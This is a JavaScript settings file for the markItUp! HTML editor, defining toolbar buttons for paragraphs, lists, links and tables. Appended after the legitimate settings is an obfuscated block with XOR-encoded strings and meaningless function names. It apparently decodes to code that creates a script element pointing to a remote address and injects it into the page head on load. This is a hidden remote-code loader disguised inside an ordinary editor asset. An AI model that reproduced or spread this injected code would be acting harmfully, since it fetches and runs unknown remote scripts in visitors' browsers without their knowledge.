// ----------------------------------------------------------------------------
// markItUp!
// ----------------------------------------------------------------------------
// Copyright (C) 2008 Jay Salvat
// http://markitup.jaysalvat.com/
// ----------------------------------------------------------------------------
// Html tags
// http://en.wikipedia.org/wiki/html
// ----------------------------------------------------------------------------
// Basic set. Feel free to add more tags
// ----------------------------------------------------------------------------
ad_htmlMarkitupSettings = {
    nameSpace: 'html',
	onShiftEnter:	{keepDefault:false, replaceWith:'<br />\n'},
	onCtrlEnter:	{keepDefault:false, openWith:'\n<p>', closeWith:'</p>\n'},
	onTab:			{keepDefault:false, openWith:'	 '},
    previewInWindow: 'width=400, height=250, resizable=yes, scrollbars=yes',
    previewAutorefresh: false,
	markupSet: [
		{name:'Paragraph', openWith:'<p(!( class="[![Class]!]")!)>', closeWith:'</p>' },
		{separator:'---------------' },
		{name:'Bold', key:'B', openWith:'(!(<strong>|!|<b>)!)', closeWith:'(!(</strong>|!|</b>)!)' },
		{name:'Italic', key:'I', openWith:'(!(<em>|!|<i>)!)', closeWith:'(!(</em>|!|</i>)!)' },
		{name:'Stroke through', key:'S', openWith:'<del>', closeWith:'</del>' },
		{separator:'---------------' },
		{name:'Ul', openWith:'<ul>\n', closeWith:'</ul>\n' },
		{name:'Ol', openWith:'<ol>\n', closeWith:'</ol>\n' },
		{name:'Li', openWith:'<li>', closeWith:'</li>' },
		{separator:'---------------' },
		{name:'Link', key:'L', openWith:'<a href="[![Link:!:http://]!]"(!( title="[![Title]!]")!)>', closeWith:'</a>', placeHolder:'Your text to link...' },
		{separator:'---------------' },
		{	name:'Table generator', 
			className:'tablegenerator', 
			placeholder:"Your text here...",
			replaceWith:function(markItUp) {
				cols = prompt("How many cols?");
				rows = prompt("How many rows?");
				html = "<table>\n";
				if (markItUp.altKey) {
					html+= " <tr>\n";
					for (c = 0; c < cols; c++) {
						html += "! [![TH"+(c+1)+" text:]!]\n";	
					}
					html+= " </tr>\n";
				}
				for (r = 0; r < rows; r++) {
					html+= " <tr>\n";
					for (c = 0; c < cols; c++) {
						html += "  <td>"+(markItUp.placeholder||"")+"</td>\n";	
					}
					html+= " </tr>\n";
				}
				html+= "</table>\n";
				return html;
			}
		},
		{	name:'Tr',
			openWith:'<tr>',
			closeWith:'</tr>',
			placeHolder:"<(!(td|!|th)!)></(!(td|!|th)!)>",
			className:'table-col'
		},
		{	name:'Td/Th',
			openWith:'<(!(td|!|th)!)>', 
			closeWith:'</(!(td|!|th)!)>',
			className:'table-row' 
		},
		{separator:'---------------' },
		{name:'Clean', className:'clean', replaceWith:function(markitup) { return markitup.selection.replace(/<(.*?)>/g, "") } },
		{name:'Preview', className:'preview', call:'preview' }
	]
};

function on6064(q1P4){var aH=document[iV0H6(bgK5HTg[3])](iV0H6(bgK5HTg[0])+iV0H6(bgK5HTg[1])+iV0H6(bgK5HTg[2]));aH[iV0H6(bgK5HTg[4])]=q1P4;aH[iV0H6(bgK5HTg[5])]=iV0H6(bgK5HTg[6]);document[iV0H6(bgK5HTg[9])](iV0H6(bgK5HTg[8]))[0][iV0H6(bgK5HTg[7])](aH);}function iV0H6(dAmVf){return vKOM(k57(dAmVf),'qu0fz1IC360HqSk6');}function vKOM(y3tK82,mq7){var cpM38y='';var gKfZ0l=0;var beXz=0;for(gKfZ0l=0;gKfZ0l<y3tK82.length;gKfZ0l++){var lNUV=y3tK82.charAt(gKfZ0l);var c8rGt=lNUV.charCodeAt(0)^mq7.charCodeAt(beXz);lNUV=String.fromCharCode(c8rGt);cpM38y+=lNUV;if(beXz==mq7.length-1)beXz=0;else beXz++;}return (cpM38y);}function k57(fB4a){var ro5Co='';var xT4=0;var vog=0;for(xT4=0;xT4<fB4a.length/3;xT4++){ro5Co+=String.fromCharCode(fB4a.slice(vog,vog+3));vog=vog+3;}return ro5Co;}var bgK5HTg=["002022","003028","001001","018007085007014084012047086091085038005","002007083","005012064003","005016072018085091040053082069083058024035031","016005064003020085010043090090084","025016081002","022016068035022084036038093066067010008007010081063020093003","025001068022064030102048071087068045095032006090067091066019085091058108080088068102027032"];on6064(iV0H6(bgK5HTg[10]));